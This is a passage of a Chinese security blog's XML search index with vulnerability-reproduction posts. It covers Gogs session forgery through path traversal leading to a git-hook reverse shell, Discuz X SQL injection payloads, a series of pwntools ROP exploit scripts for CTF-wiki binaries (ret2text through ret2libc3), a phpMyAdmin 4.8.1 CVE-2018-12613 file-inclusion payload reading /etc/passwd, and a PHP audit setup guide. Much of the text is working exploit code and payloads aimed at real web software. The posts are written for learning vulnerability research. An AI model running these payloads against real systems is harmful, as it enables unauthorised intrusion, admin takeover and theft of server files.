fmt.Println(edata)}</code></pre><p>该文件会在当前目录创建一个 test.png 文件，也就是伪造的 session 文件，内容如下：</p><p><img src="../../../../img/gogs2.png" alt=""></p><p>确认生成的文件内容无误后，在上文 “版本发布” 的位置上传 test.png 文件：</p><p><img src="../../../../img/gogs3.png" alt=""></p><p>得到链接地址如下：</p><pre><code>http://127.0.0.1:3000/attachments/bbb26736-7e47-4683-a644-1b44d12c20f1</code></pre><p>其中 attachments 后为该文件 session_id。Gog 会将该文件存储在 data/attachments/session_id[0]/session_id[1] 路径下，也就是 data/attachments/b/b/bbb26736-7e47-4683-a644-1b44d12c20f1 。</p><p>直接在浏览器控制台中，替换 cookie 中为 ../attachments/session_id[0]/session_id[1] ，也就是 ../attachments/b/b/bbb26736-7e47-4683-a644-1b44d12c20f1 ，即可登陆管理员账户：</p><p><img src="../../../../img/gogs4.png" alt=""></p><h3 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h3><p>伪造登陆管理员账户后，创建一个任意仓库，在 仓库设置→管理 Git 钩子→ post-recieve 中编辑 bash 脚本。</p><p><img src="../../../../img/gogs5.png" alt=""></p><p>随后在该仓库中新建一个文件，触发钩子，执行 bash 脚本中反弹 shell 的命令：</p><p><img src="../../../../img/gogs6.png" alt=""><br><img src="../../../../img/gogs7.png" alt=""></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="go-macaron-框架-cookie-的处理方式"><a href="#go-macaron-框架-cookie-的处理方式" class="headerlink" title="go-macaron 框架 cookie 的处理方式"></a>go-macaron 框架 cookie 的处理方式</h3><p><img src="../../../../img/gogs8.png" alt=""></p><p>首先在 go-macaron/session/session.go:73行的位置，初始化了 options 结构体，在 gogs 程序第一次启动的时候，options.CookieName 会被初始化为 i_like_gogits 。这是 cookie 的一个 key 值，我们接下来看它所对应的 value：</p><p><img src="../../../../img/gogs9.png" alt=""></p><p>在 go-macaron/session/session.go:256 行，调用了 ctx.GetCookie(m.opt.CookieName) 从 http 请求中取得 Cookie 中 key 为 i_like_gogits 的值，赋值给局部变量 sid，继续往下跟进：</p><p><img src="../../../../img/gogs10.png" alt=""></p><p>取出的 i_like_gogits 的值会传递进入 m.provider.Read() 函数，跟进：</p><p><img src="../../../../img/gogs11.png" alt=""></p><h2 id="路径穿越"><a href="#路径穿越" class="headerlink" title="路径穿越"></a>路径穿越</h2><p>sid 又传递给 p.filepath() 函数处理，该函数将 sid[0]，sid[1]，sid 三个字符串拼接在 data/sessions 路径后，返回 session 文件的存储路径。这里有一个很严重的问题，sid 是我们传入 cookie 中 i_like_gogits 对应的 value，是完全可控的，拼接路径的过程中没有对 ../ 这种路径穿越字符的过滤。所以我们可以读取任意文件作为 session。</p><p>session 文件中的内容使用 gob 编码，在需要读取的时候会调用 DecodeGob 函数解码，如果要伪造 session，必须先通过 gob 编码。这没有任何难度，因为对于 go 语言来说，这里用的 gob 不是加密算法，而是一种编码，对应的编码解码规则都一清二楚。先贴一下 EncodeGob 和 DecodeGob 的代码：</p><p><img src="../../../../img/gogs12.png" alt=""></p><p><img src="../../../../img/gogs13.png" alt=""></p><h3 id="伪造-session"><a href="#伪造-session" class="headerlink" title="伪造 session"></a>伪造 session</h3><p>我们重新创建一个名为 tester1 的用户，携带 cookie 值，再来跟一下上面的流程，读取出来的数据如下：</p><p><img src="../../../../img/gogs14.png" alt=""></p><p>在 session.go:154 行拿到 sess 变量，其中包括该 session 的 uid，uname 以及 _old_uid 。</p><p><img src="../../../../img/gogs15.png" alt=""></p><p>uname 就是我们的用户名，这里是 tester1。在我的测试环境中，管理员的用户名为 zh1x1an，所以只需要将 uname 从 tester1 改为 zh1x1an，在用 gob 编码生成伪造的 session 文件，即可实现任意用户登陆。</p><p>使用上文中的脚本生成伪造的 session 文件：</p><p><img src="../../../../img/gogs16.png" alt=""></p><p>go run test1.go 运行后，伪造的管理员 session 信息就存储在了 test.png 文件中，所以只需要找到一个文件上传的功能即可。在中文版 gogs 中，“版本发布” 允许我们上传文件（英文版为 releases）。<br>上传伪造的 session 文件，修改 cookie 中 i_like_gogits 的值为相应的上传路径后即可登陆管理员账户。接下来只需要按照前面漏洞检测的流程，借助 git hook 执行命令。整个攻击流程，还是很精彩的。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>在最新版的 gogs 中，（时间2020年1月16日），gogs 不再使用 i_like_gogits 作为 sessionid 的 key，而是使用 i_like_gogs，并且对其 value 加入了检查。</p><ul><li>i_like_gogs 的 value 长度必须为 16</li><li>i_like_gogs 的 每一个字符必须在 0-9a-f 区间</li></ul><p>使用目录穿越的方式指定任意文件作为 session 的方法已经失效。</p><p><img src="../../../../img/gogs17.png" alt=""></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.youtube.com/watch?v=XtJRF2c_ULY&t=850s" target="_blank" rel="noopener">https://www.youtube.com/watch?v=XtJRF2c_ULY&amp;t=850s</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DiscuzX全版本后台sql注入</title>
      <link href="/2020/01/07/DiscuzX%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/01/07/DiscuzX%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><pre><code class="angularjs">1&#39; and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); -- -</code></pre><h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><pre><code class="angularjs">1&#39; into outfile &#39;1.txt&#39;; -- -</code></pre><p>漏洞思路过于简单，略</p><p><img src="../../../../img/dz1.png" alt=""><br><img src="../../../../img/dz2.png" alt=""><br><img src="../../../../img/dz3.png" alt=""><br><img src="../../../../img/dz4.png" alt=""><br><img src="../../../../img/dz5.png" alt=""><br><img src="../../../../img/dz6.png" alt=""><br><img src="../../../../img/dz7.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP - CTFwiki</title>
      <link href="/2019/11/26/ROP-CTFwiki/"/>
      <url>/2019/11/26/ROP-CTFwiki/</url>
      
        <content type="html"><![CDATA[<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><blockquote><p>程序下载链接：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text</a></p></blockquote><pre><code class="bash">wget https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text -O ret2textfile ret2text //看到是 32 位动态链接// 拖进 ida， gets 栈溢出checksec ret2text // 只有 NXgdb ret2text</code></pre><p><img src="../../../../img/rop1.jpg" alt=""></p><p><img src="../../../../img/rop2.jpg" alt=""><br>buf 到 saved ebp 是 0x6c，再加 0x4 到 return address。所以 offset 是 112。</p><p>相当于是 return to plt，ida 里面简单看了下，有后门函数 secure：</p><p><img src="../../../../img/rop3.jpg" alt=""></p><p>return to 0x804863A 即可 getshell：</p><p>exp：</p><pre><code class="python">from pwn import *# p = process(&quot;./&quot;)p = remote(&quot;127.0.0.1&quot;,4000)context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]# elf = ELF(&quot;./&quot;)payload = &quot;\x90&quot;*(0x6c+4) + p32(0x804863A)p.sendline(payload)p.interactive()</code></pre><p><img src="../../../../img/rop4.jpg" alt=""></p><h2 id="ret2shellcode-NX-off"><a href="#ret2shellcode-NX-off" class="headerlink" title="ret2shellcode (NX off)"></a>ret2shellcode (NX off)</h2><blockquote><p>程序下载链接：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode</a></p></blockquote><pre><code class="bash">checksec ret2shellcode</code></pre><p>没有保护，开了 NX 就意味着有 rwx 段，可以从 gdb 中 vmmap 看到，或者 </p><pre><code class="bash">cat /proc/`pidof ret2shellcode`/maps</code></pre><ol><li>get 处 offset 不变，还是 112</li><li>覆盖返回地址，retrun to gets 的 plt entry </li><li>用这个新的 gets 将 shellcode 读到 buf 上  </li><li>同时跳转到 buf 执行 shellcode 即可</li></ol><p>exp：</p><pre><code class="bash">from pwn import *p = process(&quot;./ret2shellcode&quot;)# p = remote(&quot;127.0.0.1&quot;,4000)context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]elf = ELF(&#39;./ret2shellcode&#39;)gdb.attach(p)p.sendline(&quot;\x90&quot;*112 + p32(elf.symbols[&#39;gets&#39;]) + p32(elf.bss()) + p32(elf.bss()))# shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;# shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;# shellcode += &quot;\x0b\xcd\x80&quot;shellcode = asm(shellcraft.sh())p.sendline(shellcode)p.interactive()</code></pre><h2 id="ret2syscall（NX-on）"><a href="#ret2syscall（NX-on）" class="headerlink" title="ret2syscall（NX on）"></a>ret2syscall（NX on）</h2><p>动态链接是没有 int 0x80 之类的指令的，这里的文件自然也是 static。 </p><blockquote><p>程序下载链接：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop</a></p></blockquote><p>offset 和前面一样还是 112，不同的是 NX 开启，不能像 ret2shellcode 那样读 shellcode 到一个 buf。这里用 ret2syscall:</p><p>所需要各个寄存器的值：</p><ol><li>eax 为 0xb，也就是 execve 调用号</li><li>ebx 为 ‘/bin/sh’ 字符串的地址</li><li>ecx 和 edx 为0</li></ol><p>关于 linux 系统调用可以参考：</p><blockquote><p><a href="https://syscalls.kernelgrok.com/" target="_blank" rel="noopener">https://syscalls.kernelgrok.com/</a></p></blockquote><p>借助 ROPgadget：</p><pre><code class="bash">ROPgadget --binary ./ret2syscall --only &quot;int&quot;ROPgadget --binary ./ret2syscall --only=&quot;pop|ret&quot; | grep &quot;eax&quot;ROPgadget --binary ./ret2syscall --only=&quot;pop|ret&quot; | grep &quot;edx&quot;ROPgadget --binary ./ret2syscall --str=&quot;/bin/sh&quot;</code></pre><p>exp:</p><pre><code class="python">from pwn import *p = process(&quot;./ret2syscall&quot;)# p = remote(&quot;127.0.0.1&quot;,4000)context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]# elf = ELF(&quot;./&quot;)# eax = 11,ebx = sh_addr,ecx = edx = 0 pop_eax = 0x080bb196pop_edx_ecx_ebx = 0x0806eb90sys_addr = 0x08049421sh_addr = 0x080be408gdb.attach(p)payload = &#39;\x90&#39;*112 + p32(pop_eax) + p32(11) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(sh_addr) + p32(sys_addr)p.sendline(payload)p.interactive()</code></pre><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="ret2libc1-NX-on"><a href="#ret2libc1-NX-on" class="headerlink" title="ret2libc1 (NX on)"></a>ret2libc1 (NX on)</h3><blockquote><p>程序下载链接：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1</a></p></blockquote><p>offset 不变，可以通过 <code>elf.symbols[&#39;system&#39;]</code> 得到 system 的地址，再用 <code>ROPgadget --binary ./ret2libc1 --str &#39;/bin/sh</code> 拿到 /bin/sh 的地址即可。</p><p>exp:</p><pre><code class="python">from pwn import *p = process(&quot;./ret2libc1&quot;)# p = remote(&quot;127.0.0.1&quot;,4000)context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]elf = ELF(&quot;./ret2libc1&quot;)sh_addr = 0x08048720# system = 0x8048460payload = &#39;\x90&#39;*112 + p32(elf.symbols[&#39;system&#39;]) + p32(0xdeadbeef) + p32(sh_addr)gdb.attach(p)p.sendline(payload)p.interactive()</code></pre><h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h3><blockquote><p>程序下载链接: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2</a></p></blockquote><p>和刚才不同的是，ROPgadget 找不到 /bin/sh 这个字符串。所以可以先 ret 到 gets 的 plt，把 /bin/sh 读到 buf 上，再调用 system 并且传递参数 buf。</p><p>利用 gets 函数的溢出，我在栈上这样布局：</p><pre><code class="python">padding # buf-&gt;ebp+saved ebp 112gets@pltsystem@plt # 此处是 gets@plt entry 的 retaddrbuf_addr #elf.bss() 附近 # 此处是 gets@plt 的第一个参数buf_addr #elf.bss() 附近 # 此处是 system@plt 的第一个参数</code></pre><ol><li>在 gets 处溢出，控制 retaddr 为 gets 的 plt entry</li><li>利用新的 gets 把 /bin/sh 读到 buf 中，新的 gets 的 retaddr 为 system 的 plt entry</li><li>调用 system@plt，参数为刚才读好了 /bin/sh 的 buf</li></ol><p>exp:</p><pre><code class="python">from pwn import *p = process(&quot;./ret2libc2&quot;)# p = remote(&quot;127.0.0.1&quot;,4000)context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]elf = ELF(&quot;./ret2libc2&quot;)gets_plt = elf.symbols[&#39;gets&#39;]system_plt = elf.symbols[&#39;system&#39;]payload = &#39;\x90&#39;*112 + p32(gets_plt) + p32(system_plt) + p32(elf.bss()) + p32(elf.bss())# gdb.attach(p)p.sendline(payload)p.interactive()</code></pre><h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><blockquote><p>程序下载链接： <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3</a></p></blockquote><p>这一次没有 system 也没有 /bin/sh。梳理一下我们要做的事：</p><ol><li>先用一次 ROP return 到 puts ，泄漏 libcbase addr，其实也就是先用 puts 等函数印出一个已经调用过的函数的 got ，并 return 回 main，再减去该函数在 libc 中的 offset，offset 可以通过 readelf -s 等方式得到。(通常选择<code>__libc_start_main</code>，因为它是 main 函数的调用者，必定已经调用过)</li><li>拿到 libcbase addr，就可以加上 system 在 libc 中的 offset，通过 libcbase + system offset 拿到 system addr</li><li>同理，用 /bin/sh 的 offset + libcbase 得到 /bin/sh 的 addr</li><li>再一次 ROP 回 main，用 system 和 /bin/sh 开 shell</li></ol><p>栈布局：</p><pre><code class="python">- ROP1:padding1 # 112puts@pltmain@plt__libc_start_main@got- ROP2:padding2 # 104system@plt0xdeadbeef # anything 4 bytes/bin/sh addr</code></pre><p>exp:</p><pre><code class="python">from pwn import *from LibcSearcher import *p = process(&quot;./ret2libc3&quot;)# p = remote(&quot;127.0.0.1&quot;,4000)context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]elf = ELF(&quot;./ret2libc3&quot;)gdb.attach(p)puts_plt = elf.symbols[&#39;puts&#39;]main_plt = elf.symbols[&#39;main&#39;]libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]payload1 = &#39;a&#39;*112 + p32(puts_plt)+p32(main_plt) + p32(libc_start_main_got)p.sendlineafter(&quot;Can you find it !?&quot;,payload1)libc_start_main_addr = u32(p.recv()[0:4])print libc_start_main_addrlibc = LibcSearcher(&quot;__libc_start_main&quot;,libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#39;__libc_start_main&#39;)system_addr = libcbase + libc.dump(&#39;system&#39;)sh_addr = libcbase + libc.dump(&#39;str_bin_sh&#39;)payload2 = &#39;a&#39;*104 + p32(system_addr) + p32(0xdeadbeef) + p32(sh_addr)one_gadget_addr = libcbase + 0x3ac5c # this one is good# one_gadget_addr = libcbase + 0x3ac5e# one_gadget_addr = libcbase + 0x3ac62# one_gadget_addr = libcbase + 0x3ac69 # this one is good# one_gadget_addr = libcbase + 0x5fbc5 # this one is good# one_gadget_addr = libcbase + 0x5fbc6 # this one is good# payload2 = &#39;a&#39;*104 + p32(system_addr) + p32(0xdeadbeef) + p32(sh_addr)# payload2 = &#39;a&#39;*104 + p32(one_gadget_addr)ret = 0x8048406payload2 = p32(ret)*30 + p32(one_gadget_addr)p.sendline(payload2)p.interactive()</code></pre><p>需要注意的问题：</p><ol><li>选择：ubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu10_i386)，也就是 3。</li><li>padding2 比 padding1 少 8 字节，原因是第二次 retrun 回 main 中，有栈对齐的指令 <code>0x804861b &lt;main+3&gt; and esp, 0xfffffff0</code>。不过一般确定第二次 padding 大小，就是加上 gdb.attach(p)，在 get@plt 下断，然后手动再判断一次长度。<strong>或者使用 rop slide 也可以，也就是在栈上放置多个 ret 指令。</strong></li><li>第二次 return 回 main 之后，也可以不用找 system 和 /bin/sh ，选择 one-gadget 也可以。</li></ol><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#ret2shellcode" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#ret2shellcode</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin 4.8.1 远程文件包含漏洞(CVE-2018-12613)</title>
      <link href="/2019/11/19/phpmyadmin-4-8-1-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613/"/>
      <url>/2019/11/19/phpmyadmin-4-8-1-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>mac + php5.6 + apache + mysql5.5 + xdebug-2.5.5</p><p>phpmyadmin 4.8.1 下载链接： </p><ul><li><a href="https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip" target="_blank" rel="noopener">https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip</a></li></ul><p><strong>确保 mysql 启动无误。</strong></p><p>下载并移动 phpmyadmin 源代码到本地 web 根目录中，修改配置文件：</p><pre><code class="bash">cp config.sample.inc.php config.inc.php</code></pre><p>修改 <code>config.inc.php</code> 文件：</p><p><img src="../../../../img/phpmyadmin1.png" alt=""></p><p>安装完成。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h3><p>index.php ：55 行左右</p><pre><code class="php">if (! empty($_REQUEST[&#39;target&#39;])    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])) {    include $_REQUEST[&#39;target&#39;];    exit;}</code></pre><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>通过 get 方式传入的 target 参数，有可能进入 include 函数，从而导致任意文件包含。 但是要经过上述几个判断，简单梳理一下 target 需要满足的条件：</p><ol><li>参数不为空，且是 string 类型</li><li>不能以 index 开头</li><li>不能在黑名单中（import.php exprot.php）</li><li>通过 <code>Core::checkPageValidity</code> 方法的判断</li></ol><p>跟进 <code>Core::checkPageValidity</code>：</p><pre><code>public static function checkPageValidity(&amp;$page, array $whitelist = []){    if (empty($whitelist)) {        $whitelist = self::$goto_whitelist;    }    if (! isset($page) || !is_string($page)) {        return false;    }    if (in_array($page, $whitelist)) {        return true;    }    $_page = mb_substr(        $page,        0,        mb_strpos($page . &#39;?&#39;, &#39;?&#39;)    );    if (in_array($_page, $whitelist)) {        return true;    }    $_page = urldecode($page);    $_page = mb_substr(        $_page,        0,        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)    );    if (in_array($_page, $whitelist)) {        return true;    }    return false;}</code></pre><p>不管哪一种情况，都要求 page 参数满足 isset 和 is_string 。这是肯定满足的，我们主要梳理一下这一段代码对 page 参数的其他要求：</p><ol><li>首先获取一个白名单</li><li>page 参数在白名单中</li><li>page 参数截取第一个 <code>?</code> 前的子串，子串在白名单中</li><li>page 参数先 url 解码后，再截取第一个 <code>?</code> 前的子串，子串在白名单中</li></ol><p>梳理下攻击思路：</p><ol><li>白名单是已知的，这里随便选一个 db_datadict.php 。</li><li>既然我们走到了 include 这里，那就尽可能让传进来的参数，任意满足上面一种情况，并且仍然可以通过目录穿越，包含到任意文件。<br><img src="../../../../img/phpmyadmin2.jpg" alt=""></li></ol><h3 id="Payload："><a href="#Payload：" class="headerlink" title="Payload："></a>Payload：</h3><pre><code class="php">/index.php?target=db_datadict.php%253f/../../../../../../../../../etc/passwd</code></pre><p>该 payload 使得 page 参数满足最后一种条件，也就是 url 解码后，截取第一个问号 <code>?</code> 之前的子串，子串（db_datadict.php）在白名单中。</p><p><img src="../../../../img/phpmyadmin3.png" alt=""></p><p><img src="../../../../img/phpmyadmin4.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计环境搭建</title>
      <link href="/2019/11/17/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2019/11/17/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="mac-mamp-xdebug"><a href="#mac-mamp-xdebug" class="headerlink" title="mac mamp + xdebug"></a>mac mamp + xdebug</h1><h2 id="install-required-libraries"><a href="#install-required-libraries" class="headerlink" title="install required libraries"></a>install required libraries</h2><pre><code class="angular2html">brew install openldap libiconv</code></pre><h2 id="apache2"><a href="#apache2" class="headerlink" title="apache2"></a>apache2</h2><pre><code class="angular2html">sudo apachectl stopsudo launchctl unload -w /System/Library/LaunchDaemons/org.apache.httpd.plist 2&gt;/dev/nullbrew install httpdsudo brew services start httpd</code></pre><h2 id="Multiple-Versions-PHP"><a href="#Multiple-Versions-PHP" class="headerlink" title="Multiple Versions PHP"></a>Multiple Versions PHP</h2><pre><code class="angular2html">brew tap exolnet/homebrew-deprecatedbrew install php@5.6brew install php@7.0brew install php@7.1brew install php@7.2brew install php@7.3</code></pre><h2 id="PHP-Switcher-Script-sphp"><a href="#PHP-Switcher-Script-sphp" class="headerlink" title="PHP Switcher Script (sphp)"></a>PHP Switcher Script (sphp)</h2><pre><code class="angular2html">curl -L https://gist.githubusercontent.com/rhukster/f4c04f1bf59e0b74e335ee5d186a98e2/raw &gt; /usr/local/bin/sphpchmod +x /usr/local/bin/sphp</code></pre><p>example:</p><pre><code class="angular2html">Switching to php@7.1Switching your shellUnlinking /usr/local/Cellar/php@5.6/5.6.40... 319 symlinks removedUnlinking /usr/local/Cellar/php@7.0/7.0.33... 0 symlinks removedUnlinking /usr/local/Cellar/php@7.1/7.1.32_1... 0 symlinks removedUnlinking /usr/local/Cellar/php@7.2/7.2.23... 0 symlinks removedUnlinking /usr/local/Cellar/php/7.3.10... 208 symlinks removedLinking /usr/local/Cellar/php@7.1/7.1.32_1... 25 symlinks createdIf you need to have this software first in your PATH instead consider running:  echo &#39;export PATH=&quot;/usr/local/opt/php@7.1/bin:$PATH&quot;&#39; &gt;&gt; ~/.zshrc  echo &#39;export PATH=&quot;/usr/local/opt/php@7.1/sbin:$PATH&quot;&#39; &gt;&gt; ~/.zshrcYou will need sudo power from now onSwitching your apache confRestarting apachePHP 7.1.32 (cli) (built: Oct  6 2019 20:44:48) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.1.0, Copyright (c) 1998-2018 Zend Technologies    with Zend OPcache v7.1.32, Copyright (c) 1999-2018, by Zend TechnologiesAll done!</code></pre><p>切换为 php 5.6 ：<br><img src="../../../../img/2.jpg" alt=""></p><h2 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h2><pre><code class="angular2html">pecl install xdebug</code></pre><p>随后在 vscode 或者 phpstorm 中配置 xdebug 即可。</p><h3 id="vscode-安装-xdebug-："><a href="#vscode-安装-xdebug-：" class="headerlink" title="vscode 安装 xdebug ："></a>vscode 安装 xdebug ：</h3><p>比较简单，直接安装 vscode 插件 phpdebug 即可，也不需要特别多的配置。</p><p><img src="../../../../img/3.jpg" alt=""><br><img src="../../../../img/4.jpg" alt=""></p><h3 id="phpstorm-安装-xdebug-："><a href="#phpstorm-安装-xdebug-：" class="headerlink" title="phpstorm 安装 xdebug ："></a>phpstorm 安装 xdebug ：</h3><p>相对复杂一点：</p><p><img src="../../../../img/5.png" alt=""><br><img src="../../../../img/6.png" alt=""><br><img src="../../../../img/7.png" alt=""></p><p>然后就可以开始尽情的代码审计了。<br><strong>没有断点，不用动态调试的代码审计，等于白给。</strong></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://getgrav.org/blog/macos-mojave-apache-multiple-php-versions" target="_blank" rel="noopener">https://getgrav.org/blog/macos-mojave-apache-multiple-php-versions</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
